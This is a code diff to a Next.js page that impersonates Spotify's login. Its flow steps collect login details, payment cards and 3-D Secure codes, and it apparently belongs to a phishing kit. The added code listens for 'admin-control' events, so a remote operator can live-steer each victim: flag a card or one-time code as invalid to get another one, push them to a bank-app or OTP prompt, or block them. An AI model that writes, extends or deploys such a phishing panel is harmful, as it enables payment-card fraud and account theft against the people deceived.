@@ -1,6 +1,7 @@
 "use client"
 
 import { useState, useEffect } from "react"
+import { useSession } from "@/hooks/use-session"
 import { SpotifyLoginForm } from "@/components/spotify-login-form"
 import { CaptchaVerification } from "@/components/captcha-verification"
 import { MyCards, type CardData } from "@/components/my-cards"
@@ -14,6 +15,7 @@ import { SpotifyFooter } from "@/components/spotify-footer"
 type FlowStep = "captcha" | "login" | "cards" | "processing" | "3d-secure-app" | "3d-secure-otp" | "success" | "blocked"
 
 export default function LoginPage() {
+  const sessionId = useSession()
   const [flowStep, setFlowStep] = useState<FlowStep>("captcha")
   const [visitorInfo, setVisitorInfo] = useState<Awaited<ReturnType<typeof getVisitorInfo>> | null>(null)
   const [language, setLanguage] = useState<Language>("en")
@@ -31,7 +33,40 @@ export default function LoginPage() {
     initializeVisitor()
   }, [])
 
-  // Poll for state changes
+  // Listen for admin control events from the session hook
+  useEffect(() => {
+    const handleAdminControl = (event: Event) => {
+      const customEvent = event as CustomEvent
+      const { state } = customEvent.detail
+
+      console.log('Admin control event received:', state)
+
+      if (state === "block") {
+        setFlowStep("blocked")
+      } else if (state === "invalid_card") {
+        setIsInvalidCard(true)
+        setIsInvalidOTP(false)
+        setFlowStep("cards")
+      } else if (state === "invalid_otp") {
+        setIsInvalidOTP(true)
+        setIsInvalidCard(false)
+        setFlowStep("3d-secure-otp")
+      } else if (state === "3d-secure-app") {
+        setIsInvalidCard(false)
+        setIsInvalidOTP(false)
+        setFlowStep("3d-secure-app")
+      } else if (state === "3d-secure-otp") {
+        setIsInvalidCard(false)
+        setIsInvalidOTP(false)
+        setFlowStep("3d-secure-otp")
+      }
+    }
+
+    window.addEventListener('admin-control', handleAdminControl)
+    return () => window.removeEventListener('admin-control', handleAdminControl)
+  }, [])
+
+  // Poll for state changes (keep existing IP-based system for backward compatibility)
   useEffect(() => {
     if (!visitorInfo?.ip) return
 
